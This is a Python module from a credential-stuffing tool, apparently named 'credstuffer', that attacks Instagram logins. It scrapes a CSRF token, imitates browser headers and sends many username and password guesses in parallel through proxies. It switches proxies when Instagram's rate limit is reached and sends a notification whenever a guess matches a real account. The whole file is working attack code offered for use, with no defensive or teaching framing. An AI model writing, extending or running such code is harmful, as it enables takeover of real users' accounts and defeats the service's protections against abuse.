import re
import logging
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

from credstuffer import UserAccount
from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError, \
    InternetConnectionError


class Instagram(UserAccount):
    """ class Instagram to provide basic methods for credstuffing instagram.com

    USAGE:
            instagram = Instagram()
            instagram.login(password=password)
    """

    def __init__(self, max_requests=10000, notify=None, token=None, **kwargs):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Instagram')
        self.name = 'Instagram'

        # init base class
        super().__init__(name=self.name, notify=notify, token=token, **kwargs)

        self.url_login = "https://www.instagram.com/accounts/login/ajax/"

        self.url = "https://www.instagram.com/"
        self.csrf_token = self.get_csrf_token()
        self.session.headers.update({
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Host": "www.instagram.com",
                "Origin": "https://www.instagram.com",
                "Referer": "https://www.instagram.com/",
                "X-Instagram-AJAX": "1",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "X-CSRFToken": self.csrf_token
            })

        self.max_requests = max_requests
        self.request_counter = 0

    def get_csrf_token(self):
        """ get the csrf token from the webpage

        :return: csrf token
        """

        resp = self.session.get(url=self.url)

        csrf_token = re.search('(?<="csrf_token":")\\w+', resp.text).group(0)
        return csrf_token

    def login(self, password):
        """ requests given login data to the account

        :return: None or request Response
        """

        # check if proxy is set
        if self.session.proxies:

            # check if we need a new proxy
            if self.request_counter < self.max_requests:

                with ThreadPoolExecutor(max_workers=len(self.usernames)) as executor:

                    future_response = {executor.submit(self.__request_login, user, password): user for user in self.usernames}
                    for future in as_completed(future_response):
                        user = future_response[future]
                        statuscode = future.result().status_code
                        resp_json = future.result().json()
                        print(resp_json)
                        self.logger.info("response code: {} from Instagram with username: {}, password: {}, proxy: {}"
                                         .format(statuscode, user, password, self.session.proxies['http']))

                        if resp_json.get('message') == 'checkpoint_required':
                            self.logger.info("Found correct combination of user: {} and password: {}"
                                             .format(user, password))
                            self.send_notification(username=user, password=password)
                        elif resp_json.get('message') == 'Please wait a few minutes before you try again.':
                            self.logger.info("Renew Proxy!!!")
                            raise ProxyMaxRequestError("Max requests for instagram reached!")
                        elif (resp_json.get('authenticated') is False) and (resp_json.get('user') is False):
                            self.logger.error("User: {} not available!!".format(user))
                        elif (resp_json.get('authenticated') is False) and (resp_json.get('user') is True):
                            self.logger.info("Wrong password for user: {} and password: {}".format(user, password))
                        elif statuscode == 500:
                            self.logger.error(future.result().text)
            else:
                # raise Error to renew Proxy
                self.request_counter = 0
                self.logger.error("Max number of proxy requests reached!. Renew Proxy")
                raise ProxyMaxRequestError("Max number of proxy requests reached!")
        else:
            raise ProxyNotSetError("No Proxy was set!")

    def __request_login(self, username, password):
        """ request login with an session object

        :return: Request response object
        """
        login_form = {"username": username, "password": password}

        try:
            request_login = self.session.post(self.url_login, data=login_form, timeout=self.login_request_timeout,
                                              allow_redirects=True)

            self.request_counter += 1
        except requests.exceptions.RequestException as ex:
            if self.is_internet_available():
                raise ProxyBadConnectionError("Proxy Bad Connection: Exception: {}".format(ex))
            else:
                raise InternetConnectionError("InternetConnectionError: {}".format(ex))

        return request_login

    def set_proxy(self, proxy):
        """ sets a proxy

        """
        if isinstance(proxy, dict):
            self.logger.info("set proxy to {}".format(proxy['http']))
            self.session.proxies = proxy
        else:
            raise TypeError("proxy must be type of dictionary!")


if __name__ == '__main__':
    insta = Instagram()
    insta.set_proxy(proxy={'http': '94.23.218.85:80'})
    insta.set_usernames(usernames=[""])
    insta.login(password="")

